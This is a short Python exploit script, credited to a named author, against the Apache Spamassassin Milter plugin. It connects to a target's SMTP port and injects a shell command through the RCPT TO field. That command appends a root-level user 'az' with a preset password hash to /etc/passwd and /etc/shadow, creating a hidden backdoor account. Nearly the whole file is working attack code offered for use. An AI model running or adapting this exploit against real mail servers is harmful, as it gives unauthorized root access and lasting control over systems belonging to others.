#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Apache Spamassassin Milter Plugin - Remote Root Command Execution
# http://www.exploit-db.com/exploits/11662/

# python expl.py 192.168.13.37

# (C) 2015 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

import socket
import sys
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],25))
banner=s.recv(1024)
print banner
s.send('mail from: az@az.lan\r\n')
result=s.recv(1024)
print result
s.send('rcpt to: root+:"|echo \'az:x:0:0::/root:/bin/bash\' >> /etc/passwd && echo \'az:$1$qn9q54Bd$5Io7epAfYclG1VwgquNqe0:16514:0:99999:7:::\' >> /etc/shadow"\r\n')
result=s.recv(1024)
print result
s.close()
